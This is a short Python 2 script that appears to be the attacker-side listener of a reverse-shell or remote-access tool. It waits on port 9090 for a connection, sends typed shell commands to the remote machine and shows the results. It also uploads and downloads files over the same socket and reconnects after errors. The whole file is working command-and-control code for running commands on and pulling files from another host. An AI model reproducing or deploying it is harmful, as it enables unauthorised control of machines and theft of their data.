from __future__ import print_function
from socket import socket, error


def connection():
    s = socket()
    host = ""
    port = 9090
    s.bind((host, port))
    s.listen(1)
    print("Listening ......")
    conn, address = s.accept()
    print("Connected with " + str(address))
    print(conn.recv(1024), end="")
    while True:
        cmd = (raw_input(">"))
        if cmd[:6] == "upload":
            file = cmd[8:].split(",,")
            print(cmd)
            print(file)
            if len(file) == 2:
                try:
                    with open(file[0], "rb") as f:
                        data = f.read()
                        conn.send(cmd[:6] + file[1] + "||=shail=||" + data)
                    print(conn.recv(9000), end="")
                except IOError:
                    print("Not Any File Found")
            else:
                print("Check your input")
        elif cmd[:8] == "download":
            file = cmd[10:].split(",,")
            if len(file) == 2:
                conn.send(cmd[:8] + file[0])
                data = conn.recv(20000000).split("||=shail=||")
                if data[0] == "not found":
                    print("Not Any File Found")
                else:
                    with open(file[1], "wb") as f:
                        f.write(data[0])
                    print("File Has Been Received")
                print(data[1], end="")
            else:
                print("Check your input")
        elif len(cmd) > 0:
            conn.send(cmd)
            print(conn.recv(9999), end="")


while True:
    try:
        connection()
    except error as msg:
        print(msg)
        print("Retrying ...")
